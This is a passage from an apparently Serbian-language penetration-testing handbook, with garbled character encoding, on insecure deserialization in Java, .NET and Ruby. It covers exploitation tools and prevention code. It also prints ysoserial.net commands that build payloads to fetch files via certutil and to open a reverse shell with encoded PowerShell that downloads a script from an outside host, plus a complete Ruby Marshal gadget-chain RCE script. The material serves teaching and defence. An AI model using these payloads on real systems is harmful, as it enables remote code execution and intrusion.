MoÅ¾ete **koristiti** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **zajedno sa ysoserialom kako biste kreirali viÅ¡e eksploatacija**. ViÅ¡e informacija o ovom alatu moÅ¾ete pronaÄ‡i u **slajdovima predavanja** na kojem je alat predstavljen: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec**](https://github.com/mbechler/marshalsec) moÅ¾e se koristiti za generisanje payloada za eksploataciju razliÄitih **Json** i **Yml** biblioteka za serijalizaciju u Javi.\
Da biste kompajlirali projekat, morao sam **dodati** ove **zavisnosti** u `pom.xml`:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Instalirajte Maven**, a zatim **kompajlirajte** projekat:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

ProÄitajte viÅ¡e o ovoj Java JSON biblioteci: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laboratorije

* Ako Å¾elite da testirate neke ysoserial payload-e, moÅ¾ete **pokrenuti ovu web aplikaciju**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### ZaÅ¡to

Java koristi mnogo serializacije u razliÄite svrhe kao Å¡to su:

* **HTTP zahtevi**: Serializacija se Å¡iroko koristi u upravljanju parametrima, ViewState-om, kolaÄiÄ‡ima, itd.
* **RMI (Remote Method Invocation)**: Java RMI protokol, koji se oslanja iskljuÄivo na serializaciju, osnova je za udaljenu komunikaciju u Java aplikacijama.
* **RMI preko HTTP-a**: Ovaj metod se Äesto koristi u Java baziranim debelim klijentskim web aplikacijama, koristeÄ‡i serializaciju za sve komunikacije objekata.
* **JMX (Java Management Extensions)**: JMX koristi serializaciju za prenos objekata preko mreÅ¾e.
* **PrilagoÄ‘eni protokoli**: U Javi, standardna praksa ukljuÄuje prenos sirovih Java objekata, Å¡to Ä‡e biti prikazano u buduÄ‡im primerima eksploatacije.

### Prevencija

#### Privremeni objekti

Klasa koja implementira `Serializable` moÅ¾e oznaÄiti bilo koji objekat unutar klase koji ne bi trebalo da bude serializovan kao `transient`. Na primer:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Izbegavajte serijalizaciju klase koja mora da implementira Serializable

U scenarijima gde odreÄ‘eni **objekti moraju da implementiraju `Serializable`** interfejs zbog hijerarhije klasa, postoji rizik od nenamernog deserijalizovanja. Da biste to spreÄili, obezbedite da ovi objekti nisu deserijalizovani definisanjem `final` `readObject()` metode koja dosledno baca izuzetak, kao Å¡to je prikazano u primeru ispod:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **UnapreÄ‘enje bezbednosti deserijalizacije u Javi**

PrilagoÄ‘avanje `java.io.ObjectInputStream` je praktiÄan pristup za obezbeÄ‘ivanje procesa deserijalizacije. Ova metoda je pogodna kada:

* Kod deserijalizacije je pod vaÅ¡om kontrolom.
* Klase oÄekivane za deserijalizaciju su poznate.

PrepiÅ¡ite **`resolveClass()`** metod kako biste ograniÄili deserijalizaciju samo na dozvoljene klase. Ovo spreÄava deserijalizaciju bilo koje klase osim onih eksplicitno dozvoljenih, kao u sledeÄ‡em primeru koji ograniÄava deserijalizaciju samo na klasu `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**KoriÅ¡Ä‡enje Java agenta za poboljÅ¡anje bezbednosti** pruÅ¾a alternativno reÅ¡enje kada modifikacija koda nije moguÄ‡a. Ovaj metod se uglavnom primenjuje za **crnu listu Å¡tetnih klasa**, koriÅ¡Ä‡enjem JVM parametra:
```
-javaagent:name-of-agent.jar
```
Prati naÄin za dinamiÄko obezbeÄ‘ivanje deserijalizacije, idealno za okruÅ¾enja gde su odmahÅ¡nje promene koda nepraktiÄne.

Pogledajte primer u [rO0 od Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementiranje filtera za serijalizaciju**: Java 9 je uveo filtere za serijalizaciju putem **`ObjectInputFilter`** interfejsa, pruÅ¾ajuÄ‡i moÄ‡an mehanizam za specificiranje kriterijuma koje serijalizovani objekti moraju ispuniti pre deserijalizacije. Ovi filteri mogu biti primenjeni globalno ili po toku, nudeÄ‡i granularnu kontrolu nad procesom deserijalizacije.

Da biste koristili filtere za serijalizaciju, moÅ¾ete postaviti globalni filter koji se primenjuje na sve operacije deserijalizacije ili ga konfigurisati dinamiÄki za specifiÄne tokove. Na primer:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**IskoriÅ¡Ä‡avanje Spoljnih Biblioteka za UnapreÄ‘enu Bezbednost**: Biblioteke poput **NotSoSerial**, **jdeserialize** i **Kryo** nude napredne funkcije za kontrolisanje i praÄ‡enje Java deserijalizacije. Ove biblioteke mogu pruÅ¾iti dodatne slojeve bezbednosti, poput beleÅ¾enja ili crnog liste klasa, analiziranja serijalizovanih objekata pre deserijalizacije i implementiranja prilagoÄ‘enih strategija serijalizacije.

* **NotSoSerial** presreÄ‡e procese deserijalizacije kako bi spreÄio izvrÅ¡avanje nepoverljivog koda.
* **jdeserialize** omoguÄ‡ava analizu serijalizovanih Java objekata bez njihove deserijalizacije, pomaÅ¾uÄ‡i u identifikaciji potencijalno zlonamernog sadrÅ¾aja.
* **Kryo** je alternativni okvir za serijalizaciju koji naglaÅ¡ava brzinu i efikasnost, nudeÄ‡i konfigurabilne strategije serijalizacije koje mogu unaprediti bezbednost.

### Reference

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Razgovor o deserijalizaciji i ysoserial: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Razgovor o gadgetinspector-u: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) i slajdovi: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec rad: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Java i .Net JSON deserijalizacija **rad:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** razgovor: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) i slajdovi: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* CVE-ovi deserijalizacije: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

PronaÄ‘ite Å¡ta je **JNDI Injection, kako zloupotrebiti putem RMI, CORBA & LDAP i kako iskoristiti log4shell** (i primer ove ranjivosti) na sledeÄ‡oj stranici:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> **Java Message Service** (**JMS**) API je Java API za poruke orijentisan na poruke za slanje poruka izmeÄ‘u dva ili viÅ¡e klijenata. To je implementacija za reÅ¡avanje problema proizvoÄ‘aÄâ€“potroÅ¡aÄ. JMS je deo Java Platforme, Enterprise Edition (Java EE), i definisan je specifikacijom razvijenom u Sun Microsystems-u, ali koju je od tada vodio Java Community Process. To je standard za poruke koji omoguÄ‡ava komponentama aplikacije zasnovanim na Java EE da kreiraju, Å¡alju, primaju i Äitaju poruke. OmoguÄ‡ava komunikaciju izmeÄ‘u razliÄitih komponenti distribuirane aplikacije da bude labavo povezana, pouzdana i asinhrona. (Iz [Vikipedije](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Proizvodi

Postoji nekoliko proizvoda koji koriste ovaj middleware za slanje poruka:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (311).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1053).png>)

### Eksploatacija

Dakle, u osnovi postoji **niz usluga koje koriste JMS na opasan naÄin**. Stoga, ako imate **dovoljno privilegija** da Å¡aljete poruke ovim uslugama (obiÄno Ä‡e vam biti potrebne validne akreditacije), moÅ¾da Ä‡ete moÄ‡i da poÅ¡aljete **zlonamerne objekte serijalizovane koji Ä‡e biti deserijalizovani od strane potroÅ¡aÄa/pretplatnika**.\
To znaÄi da Ä‡e svi **klijenti koji koriste tu poruku biti zaraÅ¾eni**.

Trebalo bi da zapamtite da Äak i ako je usluga ranjiva (zbog nesigurne deserijalizacije korisniÄkog unosa), i dalje morate pronaÄ‡i validne gedÅ¾ete za iskoriÅ¡Ä‡avanje ranjivosti.

Alat [JMET](https://github.com/matthiaskaiser/jmet) je kreiran da **poveÅ¾e i napadne ove usluge slanjem nekoliko zlonamernih objekata serijalizovanih koriÅ¡Ä‡enjem poznatih gedÅ¾eta**. Ovi eksploati Ä‡e raditi ako je usluga i dalje ranjiva i ako se neki od koriÅ¡Ä‡enih gedÅ¾eta nalazi unutar ranjive aplikacije.

### Reference

* JMET razgovor: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Slajdovi: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

U kontekstu .Net-a, eksploatacije deserijalizacije funkcioniÅ¡u na naÄin sliÄan onima pronaÄ‘enim u Javi, gde se gedÅ¾eti iskoriÅ¡Ä‡avaju kako bi se izvrÅ¡io odreÄ‘eni kod tokom deserijalizacije objekta.
### Fingerprint

#### WhiteBox

Izvorni kod treba da se pregleda radi pojavljivanja:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Fokus treba da bude na serijskim alatima koji dozvoljavaju da tip bude odreÄ‘en promenljivom pod kontrolom korisnika.

#### BlackBox

Pretraga treba da cilja na Base64 kodiranu nisku **AAEAAAD/////** ili bilo koji sliÄan obrazac koji bi mogao da proÄ‘e kroz deserijalizaciju na serverskoj strani, dajuÄ‡i kontrolu nad tipom koji Ä‡e biti deserijalizovan. Ovo moÅ¾e ukljuÄivati, ali nije ograniÄeno na, **JSON** ili **XML** strukture koje sadrÅ¾e `TypeObject` ili `$type`.

### ysoserial.net

U ovom sluÄaju moÅ¾ete koristiti alat [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) kako biste **kreirali eksploate za deserijalizaciju**. Nakon preuzimanja git repozitorijuma, trebalo bi da **kompajlirate alat** koristeÄ‡i na primer Visual Studio.

Ako Å¾elite da saznate **kako ysoserial.net kreira svoj eksploat** moÅ¾ete [**proveriti ovu stranicu gde je objaÅ¡njen ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Glavne opcije **ysoserial.net** su: **`--gadget`**, **`--formatter`**, **`--output`** i **`--plugin`.**

* **`--gadget`** se koristi da se naznaÄi gadÅ¾et za zloupotrebu (naznaÄite klasu/funkciju koja Ä‡e biti zloupotrebljena tokom deserijalizacije radi izvrÅ¡avanja komandi).
* **`--formatter`**, koristi se da se naznaÄi metoda za serijalizaciju eksploata (treba da znate koju biblioteku koristi serverska strana za deserijalizaciju payloada i koristite istu za serijalizaciju).
* **`--output`** se koristi da se naznaÄi da li Å¾elite eksploat u **sirovom** ili **Base64** kodiranom obliku. _Imajte na umu da Ä‡e **ysoserial.net** **enkodirati** payload koristeÄ‡i **UTF-16LE** (kodiranje koje se podrazumevano koristi na Windows-u), pa ako dobijete sirovu verziju i samo je enkodirate sa linux konzole, moÅ¾da Ä‡ete imati nekih **problema sa kompatibilnoÅ¡Ä‡u kodiranja** koji Ä‡e spreÄiti eksploat da pravilno funkcioniÅ¡e (u HTB JSON kutiji payload je radio i u UTF-16LE i ASCII, ali to ne znaÄi da Ä‡e uvek raditi)._
* **`--plugin`** ysoserial.net podrÅ¾ava dodatke za kreiranje **eksploata za specifiÄne okvire** kao Å¡to je ViewState

#### ViÅ¡e parametara ysoserial.net

* `--minify` Ä‡e pruÅ¾iti **manji payload** (ako je moguÄ‡e)
* `--raf -f Json.Net -c "bilo Å¡ta"` Ovo Ä‡e naznaÄiti sve gadÅ¾ete koji se mogu koristiti sa navedenim formatterom (`Json.Net` u ovom sluÄaju)
* `--sf xml` moÅ¾ete **naznaÄiti gadÅ¾et** (`-g`) i ysoserial.net Ä‡e traÅ¾iti formatare koji sadrÅ¾e "xml" (bez obzira na velika/mala slova)

**Primeri ysoserial.net** za kreiranje eksploata:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** takoÄ‘e ima **vrlo interesantan parametar** koji pomaÅ¾e da bolje razumete kako svaki eksploit funkcioniÅ¡e: `--test`\
Ako navedete ovaj parametar, **ysoserial.net** Ä‡e **pokuÅ¡ati** eksploit lokalno, tako da moÅ¾ete testirati da li Ä‡e vaÅ¡ payload pravilno raditi.\
Ovaj parametar je koristan jer ako pregledate kod, pronaÄ‡i Ä‡ete delove koda poput sledeÄ‡eg (iz [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Ovo znaÄi da bi testiranje eksploatacije kod pozvalo [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
U **prethodnom kodu postoji ranjivost na kreiranu eksploataciju**. Dakle, ako pronaÄ‘ete neÅ¡to sliÄno u .Net aplikaciji, to znaÄi da je ta aplikacija verovatno ranjiva.\
Stoga **parametar `--test`** nam omoguÄ‡ava da razumemo **koji delovi koda su ranjivi** na eksploataciju deserijalizacije koju moÅ¾e da kreira **ysoserial.net**.

### ViewState

Pogledajte [ovaj POST o **kako pokuÅ¡ati eksploatisati parametar \_\_ViewState u .Net-u**](exploiting-\_\_viewstate-parameter.md) da biste **izvrÅ¡ili proizvoljni kod**. Ako **veÄ‡ znate tajne** koje koristi Å¾rtvena maÅ¡ina, [**proÄitajte ovaj post da biste znali kako izvrÅ¡iti kod**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Prevencija

Da biste umanjili rizike povezane sa deserijalizacijom u .Net-u:

* **Izbegavajte dozvoljavanje tokova podataka da definiÅ¡u svoje tipove objekata.** Koristite `DataContractSerializer` ili `XmlSerializer` kada je moguÄ‡e.
* **Za `JSON.Net`, postavite `TypeNameHandling` na `None`:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **Izbegavajte koriÅ¡Ä‡enje `JavaScriptSerializer` sa `JavaScriptTypeResolver`-om.**
* **OgraniÄite tipove koji mogu biti deserijalizovani**, razumevajuÄ‡i inherentne rizike sa .Net tipovima, kao Å¡to je `System.IO.FileInfo`, koji moÅ¾e da modifikuje osobine serverskih fajlova, potencijalno dovodeÄ‡i do napada uskraÄ‡ivanjem usluge.
* **Budite oprezni sa tipovima koji imaju riziÄne osobine**, poput `System.ComponentModel.DataAnnotations.ValidationException` sa svojom `Value` osobinom, koja moÅ¾e biti iskoriÅ¡Ä‡ena.
* **Sigurno kontroliÅ¡ite instanciranje tipova** da biste spreÄili napadaÄe da utiÄu na proces deserijalizacije, ÄineÄ‡i Äak i `DataContractSerializer` ili `XmlSerializer` ranjivim.
* **Implementirajte kontrole belih lista** koristeÄ‡i prilagoÄ‘eni `SerializationBinder` za `BinaryFormatter` i `JSON.Net`.
* **Budite informisani o poznatim nesigurnim deserijalizacionim gedÅ¾etima** unutar .Net-a i obezbedite da deserijalizatori ne instanciraju takve tipove.
* **Izolujte potencijalno riziÄan kod** od koda sa internet pristupom kako biste izbegli izlaganje poznatih gedÅ¾eta, poput `System.Windows.Data.ObjectDataProvider` u WPF aplikacijama, neosiguranim izvorima podataka.

### **Reference**

* Java i .Net JSON deserijalizacija **rad:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** prezentacija: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) i slajdovi: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

U Ruby-u, serijalizacija se olakÅ¡ava pomoÄ‡u dve metode unutar biblioteke **marshal**. Prva metoda, poznata kao **dump**, koristi se za transformisanje objekta u niz bajtova. Ovaj proces se naziva serijalizacija. Nasuprot tome, druga metoda, **load**, koristi se za vraÄ‡anje niza bajtova u objekat, proces poznat kao deserijalizacija.

Za obezbeÄ‘ivanje serijalizovanih objekata, **Ruby koristi HMAC (Hash-Based Message Authentication Code)**, obezbeÄ‘ujuÄ‡i integritet i autentiÄnost podataka. KljuÄ koji se koristi u tu svrhu Äuva se na jednom od nekoliko moguÄ‡ih lokacija:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Ruby 2.X generiÄka deserijalizacija u RCE lanac gedÅ¾eta (viÅ¡e informacija na** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Drugi RCE lanac za iskoriÅ¡Ä‡avanje Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)
